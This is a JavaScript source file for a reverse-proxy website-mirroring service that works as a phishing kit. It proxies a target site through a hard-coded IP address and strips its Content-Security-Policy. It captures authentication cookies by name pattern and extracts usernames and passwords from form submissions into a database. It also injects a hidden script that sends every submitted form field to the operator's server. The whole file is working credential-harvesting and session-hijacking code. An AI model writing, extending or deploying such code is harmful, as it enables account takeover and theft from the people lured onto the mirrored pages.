const axios = require('axios');
const cheerio = require('cheerio');
const db = require('../database');
const crypto = require('crypto');
const { URL } = require('url');
const tough = require('tough-cookie');
const { CookieJar } = tough;
const axiosCookieJarSupport = require('axios-cookiejar-support').default;
const querystring = require('querystring');

// Enable cookie jar support for axios
axiosCookieJarSupport(axios);

class WebsiteMirroringService {
  constructor() {
    this.activeSessions = new Map(); // sessionToken -> session data
    this.mirrorRoutes = new Map(); // path -> session data
    this.cookieJars = new Map(); // sessionToken -> cookieJar
    this.sessionStorage = new Map(); // sessionToken -> sessionStorage
    this.captures = new Map(); // sessionToken -> captured data (credentials, etc.)
  }

  /**
   * Create a new website mirroring session for a campaign
   * @param {number} campaignId - Campaign ID
   * @param {string} targetUrl - URL to mirror
   * @returns {Promise<Object>} Mirror session details
   */
  async createMirrorSession(campaignId, targetUrl) {
    try {
      // Generate unique session token (like iksduhfgh_7898dmndfikd)
      const sessionToken = crypto.randomBytes(16).toString('hex');
      
      // Normalize target URL
      const normalizedUrl = this.normalizeUrl(targetUrl);
      
      // Create session in database
      const sessionId = await new Promise((resolve, reject) => {
        db.run(
          `INSERT INTO WebsiteMirroringSessions 
           (campaign_id, target_url, session_token, status, proxy_port) 
           VALUES (?, ?, ?, ?, ?)`,
          [campaignId, normalizedUrl, sessionToken, 'active', 5000],
          function(err) {
            if (err) reject(err);
            else resolve(this.lastID);
          }
        );
      });

      // Create proxy URL using path-based routing on port 5000
      const proxyUrl = `http://147.93.87.182:5000/${sessionToken}`;
      
      // Create cookie jar for this session
      const cookieJar = new CookieJar();
      this.cookieJars.set(sessionToken, cookieJar);
      
      // Initialize session storage for this session
      this.sessionStorage.set(sessionToken, {});
      
      // Initialize captures for this session
      this.captures.set(sessionToken, {
        credentials: [],
        formData: [],
        cookies: []
      });
      
      // Store session info
      const sessionData = {
        sessionId,
        campaignId,
        targetUrl: normalizedUrl,
        sessionToken,
        proxyUrl,
        startTime: new Date()
      };
      
      this.activeSessions.set(sessionToken, sessionData);
      this.mirrorRoutes.set(`/${sessionToken}`, sessionData);

      console.log(`Website mirroring session created: ${proxyUrl} -> ${normalizedUrl}`);
      
      return {
        sessionId,
        sessionToken,
        proxyUrl,
        targetUrl: normalizedUrl,
        proxyPort: 5000 // Always use port 5000
      };
    } catch (error) {
      console.error('Error creating mirror session:', error);
      throw error;
    }
  }

  /**
   * Handle mirroring request for a specific session
   * @param {string} sessionToken - The session token from URL path
   * @param {object} req - Express request object
   * @param {object} res - Express response object
   */
  async handleMirrorRequest(sessionToken, req, res) {
    try {
      const session = this.activeSessions.get(sessionToken);
      
      if (!session) {
        // Session not in memory, try to load it from database
        const dbSession = await new Promise((resolve, reject) => {
          db.get(
            `SELECT * FROM WebsiteMirroringSessions 
             WHERE session_token = ? AND status = 'active'`,
            [sessionToken],
            (err, row) => {
              if (err) reject(err);
              else resolve(row);
            }
          );
        });
        
        if (dbSession) {
          // Create session in memory
          const newSession = {
            sessionId: dbSession.id,
            campaignId: dbSession.campaign_id,
            targetUrl: dbSession.target_url,
            sessionToken,
            proxyUrl: `http://147.93.87.182:5000/${sessionToken}`,
            startTime: new Date(dbSession.created_at)
          };
          
          this.activeSessions.set(sessionToken, newSession);
          this.mirrorRoutes.set(`/${sessionToken}`, newSession);
          
          // Create cookie jar for this session if it doesn't exist
          if (!this.cookieJars.has(sessionToken)) {
            this.cookieJars.set(sessionToken, new CookieJar());
          }
          
          // Initialize session storage if it doesn't exist
          if (!this.sessionStorage.has(sessionToken)) {
            this.sessionStorage.set(sessionToken, {});
          }
          
          // Initialize captures if it doesn't exist
          if (!this.captures.has(sessionToken)) {
            this.captures.set(sessionToken, {
              credentials: [],
              formData: [],
              cookies: []
            });
          }
          
          // Use newly created session
          return this.handleMirrorRequest(sessionToken, req, res);
        }
        
        return res.status(404).send('Mirror session not found or expired');
      }

      // Track the access
      await this.trackAccess(session.sessionId, req);

      // Get the target URL
      const targetUrl = session.targetUrl;
      let requestPath = req.path.replace(`/${sessionToken}`, '') || '/';
      const queryString = req.url.includes('?') ? req.url.split('?')[1] : '';
      
      // Remove tracking parameters from forwarded request
      let cleanQuery = '';
      if (queryString) {
        const params = new URLSearchParams(queryString);
        params.delete('_fstrike_track');
        cleanQuery = params.toString();
      }
      
      // Build full target URL
      let fullTargetUrl = targetUrl + requestPath;
      if (cleanQuery) {
        fullTargetUrl += '?' + cleanQuery;
      }

      console.log(`Mirroring request: ${req.method} ${req.originalUrl} -> ${fullTargetUrl}`);

      // Get the cookie jar for this session
      const cookieJar = this.cookieJars.get(sessionToken);
      
      // Handle form submissions
      if (req.method === 'POST') {
        return this.handleFormSubmission(session, req, res, fullTargetUrl, cookieJar);
      }

      // Preserve and forward client cookies along with our stored cookies
      const cookieHeader = this.buildCookieHeader(req, cookieJar, targetUrl);
      
      // Calculate hostname from the target URL
      const targetHostname = new URL(fullTargetUrl).hostname;
      const targetOrigin = new URL(fullTargetUrl).origin;

      // Make request to target website with proper headers
      const response = await axios({
        method: req.method,
        url: fullTargetUrl,
        headers: {
          'User-Agent': req.headers['user-agent'] || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
          'Accept': req.headers['accept'] || 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
          'Accept-Language': req.headers['accept-language'] || 'en-US,en;q=0.9',
          'Accept-Encoding': 'gzip, deflate, br',
          'Sec-Ch-Ua': req.headers['sec-ch-ua'] || '"Not A(Brand";v="99", "Google Chrome";v="123", "Chromium";v="123"',
          'Sec-Ch-Ua-Mobile': req.headers['sec-ch-ua-mobile'] || '?0',
          'Sec-Ch-Ua-Platform': req.headers['sec-ch-ua-platform'] || '"Windows"',
          'Sec-Fetch-Dest': req.headers['sec-fetch-dest'] || 'document',
          'Sec-Fetch-Mode': req.headers['sec-fetch-mode'] || 'navigate',
          'Sec-Fetch-Site': req.headers['sec-fetch-site'] || 'none',
          'Sec-Fetch-User': req.headers['sec-fetch-user'] || '?1',
          'Upgrade-Insecure-Requests': '1',
          'Cache-Control': req.headers['cache-control'] || 'max-age=0',
          'Host': targetHostname,
          'Connection': 'keep-alive',
          ...(cookieHeader ? {'Cookie': cookieHeader} : {}),
          ...(req.headers['referer'] ? {
            'Referer': this.translateReferer(req.headers['referer'], targetUrl, sessionToken)
          } : {})
        },
        responseType: 'arraybuffer',
        maxRedirects: 0, // Handle redirects manually
        validateStatus: () => true, // Don't throw on error status codes
        timeout: 15000,
        decompress: true,
        jar: cookieJar,
        withCredentials: true
      });
      
      // Save cookies from response
      if (response.headers['set-cookie']) {
        const cookies = Array.isArray(response.headers['set-cookie']) 
          ? response.headers['set-cookie'] 
          : [response.headers['set-cookie']];
          
        cookies.forEach(cookie => {
          this.storeCookieForLater(sessionToken, cookie, targetUrl);
        });
        
        // Track interesting cookies (like auth tokens)
        this.trackInterestingCookies(sessionToken, cookies);
      }

      // Handle redirects
      if (response.status >= 300 && response.status < 400 && response.headers.location) {
        return this.handleRedirect(session, req, res, response);
      }

      // Process response headers before sending them
      const processedHeaders = this.processResponseHeaders(response.headers, session, req);
      
      // Set all processed response headers
      Object.entries(processedHeaders).forEach(([key, value]) => {
        if (value !== undefined && value !== null) {
          res.setHeader(key, value);
        }
      });

      res.status(response.status);

      // Modify HTML content if it's HTML
      const contentType = response.headers['content-type'] || '';
      if (contentType.includes('text/html')) {
        const charset = this.extractCharset(contentType) || 'utf-8';
        const html = response.data.toString(charset);
        const modifiedHtml = this.modifyHtmlContent(html, sessionToken, targetUrl, req);
        res.send(modifiedHtml);
      } else {
        // Pass through non-HTML content unchanged
        res.send(response.data);
      }
    } catch (error) {
      console.error('Error handling mirror request:', error);
      this.handleProxyError(error, res, session);
    }
  }

  /**
   * Extract charset from content-type header
   */
  extractCharset(contentType) {
    const match = /charset=([^;]+)/i.exec(contentType);
    return match ? match[1].toLowerCase() : null;
  }

  /**
   * Handle redirects properly
   */
  handleRedirect(session, req, res, response) {
    const { headers, status } = response;
    const location = headers.location;
    const sessionToken = session.sessionToken;
    const targetUrl = session.targetUrl;
    
    console.log(`Handling redirect: ${location} (${status})`);
    
    let redirectUrl;
    
    try {
      // Check if it's an absolute URL
      if (/^https?:\/\//i.test(location)) {
        const locationUrl = new URL(location);
        const targetUrlObj = new URL(targetUrl);
        
        // If redirect is to the same domain or subdomain, proxy it
        if (locationUrl.hostname.endsWith(targetUrlObj.hostname) || 
            targetUrlObj.hostname.endsWith(locationUrl.hostname)) {
          redirectUrl = `/${sessionToken}${locationUrl.pathname}${locationUrl.search}${locationUrl.hash}`;
        } else {
          // Redirect to a different domain - we could choose to:
          // 1. Follow the redirect through the proxy (more seamless)
          // 2. Redirect directly (breaks the proxy chain)
          
          // Option 1: Follow through the proxy
          redirectUrl = `/${sessionToken}${locationUrl.pathname}${locationUrl.search}${locationUrl.hash}`;
          
          // Update the target URL for this session
          const newOrigin = `${locationUrl.protocol}//${locationUrl.host}`;
          session.targetUrl = newOrigin;
          
          console.log(`Updated target URL to: ${newOrigin} due to cross-domain redirect`);
        }
      } else {
        // Relative URL redirect
        const basePath = location.startsWith('/') ? '' : '/';
        redirectUrl = `/${sessionToken}${basePath}${location}`;
      }
    } catch (error) {
      console.error('Error processing redirect:', error);
      redirectUrl = `/${sessionToken}/`;
    }
    
    // Pass along any Set-Cookie headers with the redirect
    if (headers['set-cookie']) {
      res.setHeader('Set-Cookie', headers['set-cookie']);
    }
    
    // Perform the redirect
    return res.redirect(status, redirectUrl);
  }

  /**
   * Process response headers to ensure they work in our proxy context
   */
  processResponseHeaders(headers, session, req) {
    const result = { ...headers };
    const sessionToken = session.sessionToken;
    
    // Process Content-Security-Policy
    if (result['content-security-policy']) {
      // Modify CSP to work with our proxy
      const csp = result['content-security-policy'];
      
      // While it's best to precisely modify CSP directives, temporarily disable CSP
      // to avoid complications (in a real implementation, properly modify each directive)
      delete result['content-security-policy'];
    }
    
    // Process Set-Cookie headers
    if (result['set-cookie']) {
      // Ensure the cookie domain and path are compatible with our proxy
      const proxyHost = req.get('host');
      const cookies = Array.isArray(result['set-cookie']) ? result['set-cookie'] : [result['set-cookie']];
      
      const modifiedCookies = cookies.map(cookie => {
        // Make domain-specific cookies work on our domain instead
        return cookie
          .replace(/domain=[^;]+/gi, `domain=${proxyHost.split(':')[0]}`)
          .replace(/path=([^;]+)/gi, `path=/${sessionToken}$1`);
      });
      
      result['set-cookie'] = modifiedCookies;
    }
    
    // Remove headers that could break the proxy
    delete result['content-encoding']; // Let Express handle content encoding
    delete result['content-length']; // Let Express calculate content length
    delete result['transfer-encoding']; // Let Express handle transfer encoding
    
    return result;
  }
  
  /**
   * Build a combined cookie header from client cookies and session cookies
   */
  buildCookieHeader(req, cookieJar, targetUrl) {
    // Get cookies from jar for this URL
    const cookiesFromJar = cookieJar.getCookiesSync(targetUrl);
    const jarCookieStrings = cookiesFromJar.map(c => `${c.key}=${c.value}`);
    
    // Get cookies from request
    const requestCookies = req.headers.cookie ? req.headers.cookie.split('; ') : [];
    
    // Combine cookies (jar cookies take precedence over request cookies)
    const allCookies = [...requestCookies, ...jarCookieStrings];
    
    return allCookies.length > 0 ? allCookies.join('; ') : undefined;
  }
  
  /**
   * Store cookie for later use (even beyond tough-cookie's jar)
   */
  storeCookieForLater(sessionToken, cookieStr, targetUrl) {
    try {
      // Extract cookie info (simplified)
      const [cookieMain] = cookieStr.split(';');
      const [name, value] = cookieMain.split('=');
      
      const sessionData = this.sessionStorage.get(sessionToken) || {};
      const cookies = sessionData.cookies || {};
      
      // Store/update the cookie
      cookies[name] = value;
      sessionData.cookies = cookies;
      
      this.sessionStorage.set(sessionToken, sessionData);
    } catch (error) {
      console.error('Error storing cookie:', error);
    }
  }
  
  /**
   * Track potentially interesting cookies like auth tokens
   */
  trackInterestingCookies(sessionToken, cookies) {
    const interestingPatterns = [
      /sess/i, /auth/i, /token/i, /sid/i, /session/i, /login/i, /user/i, /pass/i,
      /account/i, /secure/i, /remember/i, /csrf/i, /xsrf/i
    ];
    
    const captures = this.captures.get(sessionToken);
    
    cookies.forEach(cookie => {
      // Check if this cookie matches any interesting patterns
      const [nameValue] = cookie.split(';');
      const [name, value] = nameValue.split('=');
      
      if (interestingPatterns.some(pattern => pattern.test(name))) {
        captures.cookies.push({
          name,
          value,
          raw: cookie,
          timestamp: new Date().toISOString()
        });
        
        console.log(`⚠️ Captured interesting cookie: ${name}`);
      }
    });
    
    this.captures.set(sessionToken, captures);
  }
  
  /**
   * Translate referer URLs to target site format
   */
  translateReferer(refererHeader, targetUrl, sessionToken) {
    // If referer is from our proxy, translate it to target site
    if (refererHeader.includes(`/${sessionToken}`)) {
      const refPath = refererHeader.split(`/${sessionToken}`)[1] || '/';
      return `${targetUrl}${refPath}`;
    }
    return refererHeader;
  }

  /**
   * Handle form submission to mirrored website
   */
  async handleFormSubmission(session, req, res, targetUrl, cookieJar) {
    try {
      console.log('⚠️ Form submission to mirrored website detected');
      
      // Extract and log form data
      const formData = { ...req.body };
      delete formData._fstrike_session; // Remove our tracking field
      
      // Check for potential credentials
      const credentialFields = this.extractCredentials(formData);
      if (credentialFields && Object.keys(credentialFields).length > 0) {
        console.log('🔑 POSSIBLE CREDENTIALS DETECTED:', JSON.stringify(credentialFields));
        
        // Store in captures
        const captures = this.captures.get(session.sessionToken);
        captures.credentials.push({
          ...credentialFields,
          timestamp: new Date().toISOString(),
          url: targetUrl,
          ip: req.ip
        });
        this.captures.set(session.sessionToken, captures);
        
        // Store in database for long-term
        try {
          db.run(
            `INSERT INTO captured_credentials (campaign_id, url, username, password, other_fields, ip_address, user_agent)
             VALUES (?, ?, ?, ?, ?, ?, ?)`,
            [
              session.campaignId, 
              targetUrl, 
              credentialFields.username || credentialFields.email || null, 
              credentialFields.password || null,
              JSON.stringify(formData),
              req.ip, 
              req.get('User-Agent')
            ],
            function(err) {
              if (err) console.error('Error storing credentials:', err);
              else console.log('💾 Credentials stored in database with ID:', this.lastID);
            }
          );
        } catch (dbError) {
          console.error('Database error when storing credentials:', dbError);
        }
      }

      // Store form submission in our database
      db.run(
        `INSERT INTO FormSubmissions (campaign_id, landing_page_id, form_data, ip_address, user_agent)
         VALUES (?, ?, ?, ?, ?)`,
        [session.campaignId, 0, JSON.stringify(formData), req.ip, req.get('User-Agent')]
      );

      console.log('Form data captured for campaign:', session.campaignId);
      
      // Prepare data for forwarding
      let forwardData;
      let contentType = req.headers['content-type'] || '';
      
      if (contentType.includes('application/x-www-form-urlencoded')) {
        forwardData = new URLSearchParams(formData).toString();
      } else if (contentType.includes('multipart/form-data')) {
        // Multipart forms should be passed directly
        forwardData = req.body;
        contentType = req.headers['content-type'];
      } else if (contentType.includes('application/json')) {
        forwardData = JSON.stringify(formData);
      } else {
        // Default to URL encoded
        forwardData = new URLSearchParams(formData).toString();
        contentType = 'application/x-www-form-urlencoded';
      }

      // Forward form submission to target website
      const targetHostname = new URL(targetUrl).hostname;
      const targetOrigin = new URL(targetUrl).origin;
      
      const cookieHeader = this.buildCookieHeader(req, cookieJar, targetUrl);
      
      const response = await axios({
        method: 'POST',
        url: targetUrl,
        data: forwardData,
        headers: {
          'User-Agent': req.headers['user-agent'] || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
          'Content-Type': contentType,
          'Accept': req.headers['accept'] || 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
          'Accept-Language': req.headers['accept-language'] || 'en-US,en;q=0.9',
          'Accept-Encoding': req.headers['accept-encoding'] || 'gzip, deflate, br',
          'Origin': targetOrigin,
          'Referer': `${targetUrl}`,
          'Host': targetHostname,
          ...(cookieHeader ? {'Cookie': cookieHeader} : {})
        },
        maxRedirects: 0, // Handle redirects manually
        validateStatus: () => true, // Accept any status code
        responseType: 'arraybuffer',
        timeout: 15000,
        jar: cookieJar,
        withCredentials: true
      });
      
      // Save cookies from response
      if (response.headers['set-cookie']) {
        const cookies = Array.isArray(response.headers['set-cookie']) 
          ? response.headers['set-cookie'] 
          : [response.headers['set-cookie']];
          
        cookies.forEach(cookie => {
          this.storeCookieForLater(session.sessionToken, cookie, targetUrl);
        });
        
        // Track interesting cookies (like auth tokens)
        this.trackInterestingCookies(session.sessionToken, cookies);
      }

      // Handle redirects
      if (response.status >= 300 && response.status < 400 && response.headers.location) {
        return this.handleRedirect(session, req, res, response);
      }

      // Process response headers
      const processedHeaders = this.processResponseHeaders(response.headers, session, req);
      
      // Set processed response headers
      Object.entries(processedHeaders).forEach(([key, value]) => {
        if (value !== undefined && value !== null) {
          res.setHeader(key, value);
        }
      });

      res.status(response.status);

      // Modify HTML content if it's HTML
      const resContentType = response.headers['content-type'] || '';
      if (resContentType.includes('text/html')) {
        const charset = this.extractCharset(resContentType) || 'utf-8';
        const html = response.data.toString(charset);
        const modifiedHtml = this.modifyHtmlContent(html, session.sessionToken, session.targetUrl, req);
        res.send(modifiedHtml);
      } else {
        // Pass through non-HTML content
        res.send(response.data);
      }
    } catch (error) {
      console.error('Error handling form submission:', error);
      this.handleProxyError(error, res, session);
    }
  }

  /**
   * Extract potential credentials from form data
   */
  extractCredentials(formData) {
    const result = {};
    const credentialFields = {
      username: [/user/i, /name/i, /login/i, /log/i, /account/i],
      email: [/mail/i, /email/i, /e-mail/i],
      password: [/pass/i, /pw/i, /passwd/i, /password/i, /pwd/i]
    };
    
    // Look for credential fields
    for (const [fieldName, value] of Object.entries(formData)) {
      if (value && typeof value === 'string') {
        // Check for email fields
        if (credentialFields.email.some(pattern => pattern.test(fieldName))) {
          if (value.includes('@')) {
            result.email = value;
          }
        }
        // Check for username fields
        else if (credentialFields.username.some(pattern => pattern.test(fieldName))) {
          result.username = value;
        }
        // Check for password fields
        else if (credentialFields.password.some(pattern => pattern.test(fieldName))) {
          result.password = value;
        }
      }
    }
    
    return result;
  }

  /**
   * Handle proxy errors gracefully
   */
  handleProxyError(error, res, session) {
    console.error('Proxy error:', error.message);
    
    let errorMessage = 'Error accessing the website';
    let statusCode = 500;
    
    if (error.response) {
      statusCode = error.response.status;
      
      if (statusCode === 400) {
        errorMessage = 'The target website rejected our request. This site might have bot protection.';
      } else if (statusCode === 401 || statusCode === 403) {
        errorMessage = 'Access denied by the target website. This site may be blocking our server.';
      } else if (statusCode === 404) {
        errorMessage = 'The requested page was not found on the target website.';
      } else if (statusCode === 429) {
        errorMessage = 'The target website is rate limiting requests. Please try again later.';
      } else if (statusCode >= 500) {
        errorMessage = 'The target website is experiencing technical difficulties.';
      } else {
        errorMessage = `Error accessing website: ${error.response.statusText || 'Unknown error'}`;
      }
    } else if (error.code === 'ECONNABORTED') {
      statusCode = 504;
      errorMessage = 'Connection to the target website timed out.';
    } else if (error.code === 'ENOTFOUND') {
      statusCode = 502;
      errorMessage = 'Could not resolve target website hostname.';
    } else {
      statusCode = 500;
      errorMessage = 'An error occurred while connecting to the target website.';
    }
    
    res.status(statusCode).send(`
      <html>
        <head>
          <title>Connection Error</title>
          <style>
            body { font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; }
            h1 { color: #d9534f; }
            .message { background-color: #f9f9f9; padding: 15px; border-radius: 5px; }
            .try-again { margin-top: 20px; }
          </style>
        </head>
        <body>
          <h1>Connection Error</h1>
          <div class="message">
            <p>${errorMessage}</p>
          </div>
          <div class="try-again">
            <p><a href="javascript:location.reload()">Try again</a></p>
          </div>
        </body>
      </html>
    `);
  }

  /**
   * Modify HTML content to inject tracking and fix relative links
   */
  modifyHtmlContent(html, sessionToken, targetUrl, req) {
    try {
      const baseUrl = new URL(targetUrl);
      const proxyPath = `/${sessionToken}`;

      // Use Cheerio to modify the HTML
      const $ = cheerio.load(html);

      // Add base tag if it doesn't exist, or modify existing one
      const baseTag = $('base');
      if (baseTag.length > 0) {
        baseTag.attr('href', `${targetUrl}/`);
      } else {
        $('head').prepend(`<base href="${targetUrl}/" />`);
      }

      // Rewrite all relative links to use our proxy
      $('a[href]').each((i, elem) => {
        const href = $(elem).attr('href');
        if (!href) return;
        
        // Skip fragment-only links
        if (href.startsWith('#')) return;
        
        // Skip javascript: and mailto: links
        if (href.startsWith('javascript:') || href.startsWith('mailto:')) return;
        
        try {
          // Try to construct an absolute URL
          const absoluteUrl = new URL(href, targetUrl);
          
          // If same origin, rewrite to use our proxy
          if (absoluteUrl.origin === baseUrl.origin) {
            const path = absoluteUrl.pathname + absoluteUrl.search + absoluteUrl.hash;
            $(elem).attr('href', `${proxyPath}${path}`);
          }
          // For external links, keep as is
        } catch (e) {
          // Handle invalid URLs by making a best effort guess
          if (href.startsWith('/')) {
            // Absolute path
            $(elem).attr('href', `${proxyPath}${href}`);
          } else {
            // Relative path - convert to absolute with our proxy
            $(elem).attr('href', `${proxyPath}/${href}`);
          }
        }
      });

      // Fix forms to submit through our proxy
      $('form').each((i, elem) => {
        const $form = $(elem);
        const action = $form.attr('action') || '';
        
        // Skip javascript: actions
        if (action.startsWith('javascript:')) return;
        
        // Add tracking field
        $form.append(`<input type="hidden" name="_fstrike_session" value="${sessionToken}" style="display:none">`);
        
        try {
          // Try to construct an absolute URL for the action
          const absoluteAction = new URL(action, targetUrl);
          
          // If same origin as target, rewrite to use our proxy
          if (absoluteAction.origin === baseUrl.origin) {
            const path = absoluteAction.pathname + absoluteAction.search + absoluteAction.hash;
            $form.attr('action', `${proxyPath}${path}`);
          }
          // For external form submissions, keep as is
        } catch (e) {
          // Handle invalid URLs
          if (action === '') {
            // No action, use current path
            $form.attr('action', req.originalUrl);
          } else if (action.startsWith('/')) {
            // Absolute path
            $form.attr('action', `${proxyPath}${action}`);
          } else {
            // Relative path
            $form.attr('action', `${proxyPath}/${action}`);
          }
        }
      });

      // Fix resources (images, scripts, stylesheets, etc.)
      $('[src], [href]:not(a)').each((i, elem) => {
        const attrName = $(elem).attr('src') ? 'src' : 'href';
        const attrVal = $(elem).attr(attrName);
        
        if (!attrVal) return;
        
        // Skip data: URLs
        if (attrVal.startsWith('data:')) return;
        
        try {
          // Try to construct an absolute URL
          const absoluteUrl = new URL(attrVal, targetUrl);
          
          // For same origin, rewrite to absolute URL to avoid proxy confusion
          if (absoluteUrl.origin === baseUrl.origin) {
            // Two options: rewrite through proxy or keep original URL
            
            // Option 1: Keep original absolute URL for resources
            // $(elem).attr(attrName, absoluteUrl.href);
            
            // Option 2: Route through proxy
            const path = absoluteUrl.pathname + absoluteUrl.search;
            $(elem).attr(attrName, `${proxyPath}${path}`);
          }
          // For external resources, keep as is
        } catch (e) {
          // Handle invalid URLs
          if (attrVal.startsWith('//')) {
            // Protocol-relative URL
            $(elem).attr(attrName, `https:${attrVal}`);
          } else if (attrVal.startsWith('/')) {
            // Absolute path
            $(elem).attr(attrName, `${proxyPath}${attrVal}`);
          } else {
            // Relative path
            $(elem).attr(attrName, `${proxyPath}/${attrVal}`);
          }
        }
      });

      // Fix inline CSS with url() references
      $('[style]').each((i, elem) => {
        const style = $(elem).attr('style');
        if (!style || !style.includes('url(')) return;
        
        const newStyle = style.replace(/url\((['"]?)([^'"]+)\1\)/g, (match, quote, url) => {
          if (url.startsWith('data:')) return match;
          
          try {
            // Try to construct an absolute URL
            const absoluteUrl = new URL(url, targetUrl);
            
            if (absoluteUrl.origin === baseUrl.origin) {
              // Same origin, route through proxy
              const path = absoluteUrl.pathname + absoluteUrl.search;
              return `url(${proxyPath}${path})`;
            }
            // Different origin, keep as is
            return match;
          } catch (e) {
            // Handle invalid URLs
            if (url.startsWith('/')) {
              // Absolute path
              return `url(${proxyPath}${url})`;
            } else {
              // Relative path
              return `url(${proxyPath}/${url})`;
            }
          }
        });
        
        $(elem).attr('style', newStyle);
      });

      // Fix CSS <style> blocks
      $('style').each((i, elem) => {
        const css = $(elem).html();
        if (!css || !css.includes('url(')) return;
        
        const newCss = css.replace(/url\((['"]?)([^'"]+)\1\)/g, (match, quote, url) => {
          if (url.startsWith('data:')) return match;
          
          try {
            // Try to construct an absolute URL
            const absoluteUrl = new URL(url, targetUrl);
            
            if (absoluteUrl.origin === baseUrl.origin) {
              // Same origin, route through proxy
              const path = absoluteUrl.pathname + absoluteUrl.search;
              return `url(${proxyPath}${path})`;
            }
            // Different origin, keep as is
            return match;
          } catch (e) {
            // Handle invalid URLs
            if (url.startsWith('/')) {
              // Absolute path
              return `url(${proxyPath}${url})`;
            } else {
              // Relative path
              return `url(${proxyPath}/${url})`;
            }
          }
        });
        
        $(elem).html(newCss);
      });

      // Inject invisible tracking pixel
      $('body').append(`
        <img src="/api/track-mirror-view/${sessionToken}" 
             style="position:absolute; width:1px; height:1px; opacity:0.01; pointer-events:none;" 
             alt="" />
      `);
      
      // Inject invisible tracker to capture credentials via JavaScript
      $('body').append(`
        <script style="display:none">
          // Monitor form submissions
          document.addEventListener('submit', function(e) {
            try {
              var form = e.target;
              var data = {};
              for (var i = 0; i < form.elements.length; i++) {
                var input = form.elements[i];
                if (input.name && input.value && input.type !== 'submit' && input.type !== 'button') {
                  data[input.name] = input.value;
                }
              }
              
              // Send data to our server
              var xhr = new XMLHttpRequest();
              xhr.open('POST', '/api/proxy-monitor/${sessionToken}', true);
              xhr.setRequestHeader('Content-Type', 'application/json');
              xhr.send(JSON.stringify({type: 'form', data: data, url: location.href}));
            } catch(err) {
              // Silent fail
            }
          }, true);
        </script>
      `);

      return $.html();
    } catch (error) {
      console.error('Error modifying HTML content:', error);
      return html;
    }
  }

  /**
   * Track access to mirrored content
   */
  async trackAccess(sessionId, req) {
    try {
      const timestamp = new Date().toISOString();
      const ip = req.ip || req.connection.remoteAddress;
      const userAgent = req.get('User-Agent') || '';
      const trackingParam = req.query._fstrike_track;

      // Update last accessed time and increment counter
      db.run(
        `UPDATE WebsiteMirroringSessions 
         SET last_accessed = ?, access_count = access_count + 1 
         WHERE id = ?`,
        [timestamp, sessionId]
      );

      // Log visit with tracking ID if present
      if (trackingParam) {
        console.log(`Mirror access tracked with ID ${trackingParam}: Session ${sessionId}, IP: ${ip}`);
        
        // Check if this corresponds to a tracking pixel
        db.get(
          `SELECT user_email FROM tracking_pixels WHERE id = ?`,
          [trackingParam],
          (err, row) => {
            if (!err && row) {
              console.log(`Mirror access by user: ${row.user_email}`);
              
              // Create link_clicks table if it doesn't exist
              db.run(`CREATE TABLE IF NOT EXISTS link_clicks (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                campaign_id INTEGER,
                landing_page_id INTEGER,
                ip_address TEXT,
                user_agent TEXT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
              )`, function(createErr) {
                if (createErr) {
                  console.error('Error creating link_clicks table:', createErr);
                  return;
                }
                
                // Now insert the click data
                db.run(
                  `INSERT INTO link_clicks (campaign_id, landing_page_id, ip_address, user_agent)
                   VALUES (?, 0, ?, ?)`,
                  [sessionId, ip, userAgent]
                );
              });
            }
          }
        );
      } else {
        console.log(`Mirror access tracked: Session ${sessionId}, IP: ${ip}, Path: ${req.path}`);
      }
    } catch (error) {
      console.error('Error tracking access:', error);
    }
  }

  /**
   * Stop a mirroring session
   */
  async stopMirrorSession(sessionId) {
    try {
      // Find session by ID
      let sessionToken = null;
      for (const [token, session] of this.activeSessions.entries()) {
        if (session.sessionId === sessionId) {
          sessionToken = token;
          break;
        }
      }

      if (sessionToken) {
        // Get final state of captures
        const captures = this.captures.get(sessionToken);
        
        // Store captures in database if there are any credentials
        if (captures && captures.credentials.length > 0) {
          db.run(
            `UPDATE WebsiteMirroringSessions 
             SET captured_data = ? 
             WHERE id = ?`,
            [JSON.stringify(captures), sessionId]
          );
          
          console.log(`Stored ${captures.credentials.length} credential sets for session ${sessionId}`);
        }
        
        // Clean up memory
        this.activeSessions.delete(sessionToken);
        this.mirrorRoutes.delete(`/${sessionToken}`);
        this.cookieJars.delete(sessionToken);
        this.sessionStorage.delete(sessionToken);
        this.captures.delete(sessionToken);
      }

      // Update database
      await new Promise((resolve, reject) => {
        db.run(
          `UPDATE WebsiteMirroringSessions 
           SET status = 'inactive' 
           WHERE id = ?`,
          [sessionId],
          (err) => {
            if (err) reject(err);
            else resolve();
          }
        );
      });

      console.log(`Mirror session ${sessionId} stopped`);
    } catch (error) {
      console.error('Error stopping mirror session:', error);
      throw error;
    }
  }

  /**
   * Get mirroring session details
   */
  async getMirrorSession(campaignId) {
    return new Promise((resolve, reject) => {
      db.get(
        `SELECT * FROM WebsiteMirroringSessions 
         WHERE campaign_id = ? AND status = 'active' 
         ORDER BY created_at DESC LIMIT 1`,
        [campaignId],
        (err, row) => {
          if (err) reject(err);
          else resolve(row);
        }
      );
    });
  }

  /**
   * Helper methods
   */
  normalizeUrl(url) {
    if (!url.startsWith('http://') && !url.startsWith('https://')) {
      url = 'https://' + url;
    }
    return url.endsWith('/') ? url.slice(0, -1) : url;
  }

  /**
   * Clean up inactive sessions
   */
  async cleanupSessions() {
    try {
      // Stop sessions that haven't been accessed in 24 hours
      const cutoffTime = new Date(Date.now() - 24 * 60 * 60 * 1000);
      
      const inactiveSessions = await new Promise((resolve, reject) => {
        db.all(
          `SELECT id FROM WebsiteMirroringSessions 
           WHERE status = 'active' 
           AND (last_accessed IS NULL OR last_accessed < ?)`,
          [cutoffTime.toISOString()],
          (err, rows) => {
            if (err) reject(err);
            else resolve(rows);
          }
        );
      });

      for (const session of inactiveSessions) {
        await this.stopMirrorSession(session.id);
      }

      console.log(`Cleaned up ${inactiveSessions.length} inactive mirroring sessions`);
    } catch (error) {
      console.error('Error cleaning up sessions:', error);
    }
  }
